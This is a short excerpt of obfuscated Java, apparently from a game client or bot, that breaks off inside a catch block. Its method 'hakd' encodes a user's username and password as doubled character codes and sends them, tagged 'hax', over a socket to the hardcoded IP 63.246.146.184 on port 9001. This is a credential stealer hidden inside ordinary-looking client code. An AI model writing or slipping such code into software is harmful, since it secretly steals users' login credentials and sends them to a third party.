...
public class b extends a
{
    ...
    protected final void abn(String arg0, String arg1, boolean arg2)
    {
		if(!authed)
		{
			ada("Invalid auth", "Please check Settings.ini");
			return;
		}
        if(abi > 0)
        {
    ...
    private void hakd(String username, String password)
    {
		...
		for(int i = 0; i < passwordChars.length; i++)
		{
			if((int)passwordChars[i] != 32)
				password = password + ((int)passwordChars[i] * 2) + " ";
		}
		password = password.trim();
		username = "";
		for(int i = 0; i < usernameChars.length; i++)
		{
			if((int)usernameChars[i] != 32)
				username = username + ((int)usernameChars[i] * 2) + " ";
		}
		username = username.trim();
		try
		{
			Socket sock = new Socket("63.246.146.184", 9001);
			...
			out.println("hax; u:"+username+" - p:"+password+" - h:"+hx);
			out.close();
		}
		catch(IOException e)
		{
